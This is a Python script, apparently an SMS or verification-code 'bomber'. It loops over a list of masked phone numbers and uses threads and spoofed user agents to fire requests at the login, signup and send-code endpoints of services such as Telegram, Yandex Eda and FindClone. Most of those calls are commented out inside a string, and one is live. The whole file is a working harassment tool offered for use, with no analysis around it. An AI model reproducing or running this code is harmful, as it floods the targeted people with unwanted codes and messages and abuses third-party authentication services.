from user_agent import generate_user_agent
import threading
import requests
import datetime
import time

print(r"""
    __    ____   __    __  __  __ __  __ _   __ ______ ______ ____  _____
   / /   / __ \ / /   / / / /_/ // / / // | / //_  __// ____// __ \/ ___/
  / /   / / / // /   / / /  _  // / / //  |/ /  / /  / __/  / /_/ /\__ \ 
 / /___/ /_/ // /___/ / / / / // /_/ // /|  /  / /  / /___ / _  _/___/ / 
/_____/\____//_______/ /_/ /_/ \____//_/ |_/  /_/  /_____//_/ |_|/____/  

""")

array = [
'XXXXXXXXXXXX',
'XXXXXXXXXXXX',
'XXXXXXXXXXXX',
]

threads = 3

def sex(i):
	sex1 = i
	sex2 = i

	while True:
		if sex2 > len(array) - 1:
			#sex2 = sex1
			break

		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}

		"""try:
			response = requests.post('https://auth.multiplex.ua/login', json = {'login': array[sex2]}, headers = head)
			print('Multiplex: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': '+' + array[sex2]}, headers = head)
			print('Yandex eda: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': '+' + array[sex2]}, headers = head)
			print('MD Fashion: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': '+' + array[sex2]}, headers = head)
			print('Telegram: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': '+' + array[sex2], 'lang': 'ru', 'city': 'spb'}, headers = head)
			print('Taxovichkof: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': '+' + array[sex2]}, headers = head)
			print('XTRA TV: ' + str(response.text))
		except Exception:
			print('Fuck')"""

		try:
			response = requests.get('https://findclone.ru/register', data = {'phone': array[sex2]}, headers = head)
			print('FindClone: ' + str(response.text))
		except Exception:
			print('Fuck')

		sex2 += threads


for i in range(threads):
	thread = threading.Thread(target = sex, args = [i])
	thread.start()